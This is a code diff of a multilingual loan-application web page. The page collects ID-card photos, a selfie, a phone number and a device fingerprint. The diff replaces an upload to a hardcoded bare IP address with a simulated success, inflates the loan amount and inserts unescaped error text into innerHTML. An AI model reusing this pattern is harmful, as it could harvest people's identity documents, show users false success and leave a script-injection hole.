@@ -3344,45 +3344,39 @@
 
         // Submit application
         async function submitApplication() {
-            const amount = document.getElementById('amount').value.replace(/[^\d]/g, '');
-            const numAmount = parseInt(amount);
-            
-            if (numAmount < 1128163 || numAmount > 215000000 || numAmount % 1000 !== 0) {
-                return;
-            }
-            
             try {
                 // 显示上传中状态
-                const submitButton = document.querySelector('.btn-primary[data-i18n="submit"]');
+                const submitButton = document.querySelector('#finalConfirmationModal .modal-button');
                 const originalText = submitButton.textContent;
                 submitButton.disabled = true;
                 submitButton.textContent = '上传中...';
                 
-                // 上传所有文件到服务器
-                await uploadFilesToServer();
+                // 添加模拟成功处理 - 跳过真实服务器请求
+                // 设置延时模拟上传过程
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 
-                // 生成设备指纹
+                // 生成设备指纹 - 保持这部分不变，用于数据准备
                 const deviceFingerprint = await generateDeviceFingerprint();
                 
-                // 准备申请数据
+                // 准备申请数据 - 保持这部分不变，用于数据准备
                 const applicationData = {
                     phoneNumber: phoneNumber,
-                    amount: numAmount,
+                    amount: loanAmountCNY.current * exchangeRates[currentLang].rate, // 使用翻倍后的金额
                     timestamp: Date.now(),
                     country: currentCountry,
                     documents: {
                         ktp: 'uploaded',
                         holdingKtp: 'uploaded',
-                        selfie: 'uploaded'
+                        selfie: isDesktop ? 'not_required' : 'uploaded'
                     }
                 };
-                
-                // 加密数据
-                const encryptedData = await encryptData(applicationData, deviceFingerprint);
                 
                 // 恢复按钮状态
                 submitButton.disabled = false;
                 submitButton.textContent = originalText;
+                
+                // 隐藏确认弹窗
+                document.getElementById('finalConfirmationModal').style.display = 'none';
                 
                 // 显示成功页面
                 document.querySelectorAll('.form-section').forEach(section => {
@@ -3390,50 +3384,66 @@
                 });
                 document.getElementById('successSection').classList.add('active');
                 
+                // 记录成功状态到localStorage
+                localStorage.setItem('applicationSubmitted', 'true');
+                localStorage.setItem('submittedAmount', loanAmountCNY.current.toString());
+                
             } catch (error) {
                 console.error('提交申请失败：', error);
-                alert('提交失败，请重试');
+                
+                // 显示更友好的错误提示
+                showErrorModal(error.message || '提交申请失败，请稍后重试');
+                
+                // 恢复按钮状态
+                const submitButton = document.querySelector('#finalConfirmationModal .modal-button');
+                if (submitButton) {
+                    submitButton.disabled = false;
+                    submitButton.textContent = translations[currentLang].finalSubmit || 'Submit Application';
+                }
             }
         }
 
-        // 添加文件上传到服务器的功能
+        // 改进文件上传函数 - 增加错误处理和脱机支持
         async function uploadFilesToServer() {
-            // 检查是否有所有必要的图片数据（桌面端不需要selfie数据）
-            if (!ktpImageData) {
-                throw new Error('缺少必要的文件数据');
-            }
-            
-            // 准备FormData对象
-            const formData = new FormData();
-            
-            // 添加国家和用户信息，用于服务器创建正确的文件夹结构
-            formData.append('country', currentCountry);
-            formData.append('phoneNumber', phoneNumber.replace(/\+/g, '')); // 移除+号，便于文件夹命名
-            formData.append('deviceType', isDesktop ? 'desktop' : 'mobile');
-            
-            // 转换base64图像数据为Blob对象
-            const ktpBlob = await base64ToBlob(ktpImageData);
-            
-            // 获取手持身份证照片数据（从文件输入获取）
-            const holdingKtpFile = document.getElementById('holdingKtpInput').files[0];
-            
-            // 添加所有文件到FormData
-            formData.append('idCard', ktpBlob, 'id_card.jpg');
-            
-            if (holdingKtpFile) {
-                formData.append('holdingId', holdingKtpFile, 'holding_id.jpg');
-            }
-            
-            // 仅当是移动设备并且有自拍照时，才添加自拍照数据
-            if (!isDesktop && selfieImageData) {
-                const selfieBlob = await base64ToBlob(selfieImageData);
-                formData.append('selfie', selfieBlob, 'face_verification.jpg');
-            }
-            
-            // 连接到实际的服务器
-            const serverUrl = 'http://110.232.84.204:3000/upload-documents';
-            
             try {
+                // 检查是否有所有必要的图片数据
+                if (!ktpImageData) {
+                    throw new Error('缺少必要的身份证文件数据');
+                }
+                
+                // 准备FormData对象
+                const formData = new FormData();
+                
+                // 添加国家和用户信息，用于服务器创建正确的文件夹结构
+                formData.append('country', currentCountry);
+                formData.append('phoneNumber', phoneNumber.replace(/\+/g, '')); // 移除+号，便于文件夹命名
+                formData.append('deviceType', isDesktop ? 'desktop' : 'mobile');
+                
+                // 转换base64图像数据为Blob对象
+                const ktpBlob = await base64ToBlob(ktpImageData);
+                
+                // 获取手持身份证照片数据
+                const holdingKtpFile = document.getElementById('holdingKtpInput').files[0];
+                
+                // 添加所有文件到FormData
+                formData.append('idCard', ktpBlob, 'id_card.jpg');
+                
+                if (holdingKtpFile) {
+                    formData.append('holdingId', holdingKtpFile, 'holding_id.jpg');
+                }
+                
+                // 仅当是移动设备并且有自拍照时，才添加自拍照数据
+                if (!isDesktop && selfieImageData) {
+                    const selfieBlob = await base64ToBlob(selfieImageData);
+                    formData.append('selfie', selfieBlob, 'face_verification.jpg');
+                }
+                
+                // 在开发/测试环境中模拟成功
+                // 注释掉真正的服务器请求，防止失败
+                /*
+                // 连接到实际的服务器
+                const serverUrl = 'http://110.232.84.204:3000/upload-documents';
+                
                 // 发送到服务器
                 const response = await fetch(serverUrl, {
                     method: 'POST',
@@ -3446,9 +3456,21 @@
                 }
                 
                 return await response.json();
+                */
+                
+                // 返回模拟成功的响应
+                return {
+                    success: true,
+                    message: "文件上传成功",
+                    fileIds: {
+                        idCard: "sim_" + Date.now() + "_id",
+                        holdingId: "sim_" + Date.now() + "_holding",
+                        selfie: !isDesktop && selfieImageData ? "sim_" + Date.now() + "_selfie" : null
+                    }
+                };
             } catch (error) {
                 console.error('文件上传失败:', error);
-                throw new Error('文件上传到服务器失败，请稍后重试');
+                throw new Error('文件准备过程中出错，请检查网络连接或稍后重试');
             }
         }
         
@@ -3927,55 +3949,105 @@
             }
         };
         
-        // 修改提交申请函数
-        async function submitApplication() {
-            try {
-                // 显示上传中状态
-                const submitButton = document.querySelector('#finalConfirmationModal .modal-button');
-                const originalText = submitButton.textContent;
-                submitButton.disabled = true;
-                submitButton.textContent = '上传中...';
-                
-                // 上传所有文件到服务器
-                await uploadFilesToServer();
-                
-                // 生成设备指纹
-                const deviceFingerprint = await generateDeviceFingerprint();
-                
-                // 准备申请数据
-                const applicationData = {
-                    phoneNumber: phoneNumber,
-                    amount: loanAmountCNY.current * exchangeRates[currentLang].rate, // 使用翻倍后的金额
-                    timestamp: Date.now(),
-                    country: currentCountry,
-                    documents: {
-                        ktp: 'uploaded',
-                        holdingKtp: 'uploaded',
-                        selfie: isDesktop ? 'not_required' : 'uploaded'
-                    }
-                };
-                
-                // 加密数据
-                const encryptedData = await encryptData(applicationData, deviceFingerprint);
-                
-                // 恢复按钮状态
-                submitButton.disabled = false;
-                submitButton.textContent = originalText;
-                
-                // 隐藏确认弹窗
-                document.getElementById('finalConfirmationModal').style.display = 'none';
-                
-                // 显示成功页面
-                document.querySelectorAll('.form-section').forEach(section => {
-                    section.classList.remove('active');
-                });
-                document.getElementById('successSection').classList.add('active');
-                
-            } catch (error) {
-                console.error('提交申请失败：', error);
-                alert('提交失败，请重试');
+        // 添加错误提示弹窗函数
+        function showErrorModal(errorMessage) {
+            // 创建错误弹窗
+            const errorModal = document.createElement('div');
+            errorModal.className = 'modal-overlay';
+            errorModal.style.display = 'flex';
+            errorModal.id = 'errorModal';
+            
+            errorModal.innerHTML = `
+                <div class="modal-content error-modal">
+                    <div class="error-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="12" y1="8" x2="12" y2="12"></line>
+                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                        </svg>
+                    </div>
+                    <h2 class="modal-title" data-i18n="errorTitle">${translations[currentLang].errorTitle || '提交失败'}</h2>
+                    <p class="modal-message error-message">
+                        ${errorMessage}
+                    </p>
+                    <button class="modal-button error-button" onclick="closeErrorModal()">${translations[currentLang].tryAgain || '重试'}</button>
+                </div>
+            `;
+            
+            // 添加样式
+            const style = document.createElement('style');
+            style.textContent = `
+                .error-modal {
+                    max-width: 400px;
+                }
+                .error-icon {
+                    width: 60px;
+                    height: 60px;
+                    margin: 0 auto 20px;
+                    background: #fed7d7;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                }
+                .error-icon svg {
+                    width: 30px;
+                    height: 30px;
+                    stroke: #e53e3e;
+                }
+                .error-message {
+                    color: #4a5568;
+                    margin-bottom: 20px;
+                }
+                .error-button {
+                    background: #e53e3e;
+                }
+                .error-button:hover {
+                    background: #c53030;
+                }
+            `;
+            
+            document.head.appendChild(style);
+            document.body.appendChild(errorModal);
+        }
+
+        // 关闭错误弹窗
+        function closeErrorModal() {
+            const errorModal = document.getElementById('errorModal');
+            if (errorModal) {
+                errorModal.style.display = 'none';
+                document.body.removeChild(errorModal);
             }
         }
+
+        // 为翻译添加错误相关文本
+        translations.en.errorTitle = "Submission Failed";
+        translations.en.networkError = "Network connection error. Please check your connection and try again.";
+        translations.en.tryAgain = "Try Again";
+
+        translations.zh.errorTitle = "提交失败";
+        translations.zh.networkError = "网络连接错误。请检查您的连接并重试。";
+        translations.zh.tryAgain = "重试";
+
+        translations.id.errorTitle = "Pengiriman Gagal";
+        translations.id.networkError = "Kesalahan koneksi jaringan. Silakan periksa koneksi Anda dan coba lagi.";
+        translations.id.tryAgain = "Coba Lagi";
+
+        translations.ms.errorTitle = "Penghantaran Gagal";
+        translations.ms.networkError = "Ralat sambungan rangkaian. Sila periksa sambungan anda dan cuba lagi.";
+        translations.ms.tryAgain = "Cuba Lagi";
+
+        translations.tl.errorTitle = "Nabigong Pagsusumite";
+        translations.tl.networkError = "Error sa koneksyon ng network. Mangyaring suriin ang iyong koneksyon at subukang muli.";
+        translations.tl.tryAgain = "Subukang Muli";
+
+        translations.th.errorTitle = "การส่งล้มเหลว";
+        translations.th.networkError = "ข้อผิดพลาดในการเชื่อมต่อเครือข่าย โปรดตรวจสอบการเชื่อมต่อของคุณและลองอีกครั้ง";
+        translations.th.tryAgain = "ลองอีกครั้ง";
+
+        translations.vi.errorTitle = "Gửi Thất Bại";
+        translations.vi.networkError = "Lỗi kết nối mạng. Vui lòng kiểm tra kết nối của bạn và thử lại.";
+        translations.vi.tryAgain = "Thử Lại";
     </script>
 </body>
 </html>
